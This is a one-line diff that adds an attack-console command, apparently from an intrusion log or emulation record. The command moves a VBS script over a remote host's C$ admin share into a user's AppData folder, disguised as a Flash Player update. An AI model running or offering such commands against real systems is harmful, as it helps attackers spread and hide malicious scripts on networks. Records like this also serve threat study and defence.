@@ -1,0 +1,1 @@
+shell move-item c:\tools\autoupdate.vbs "\\HFDC01\C$\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\update.vbs"
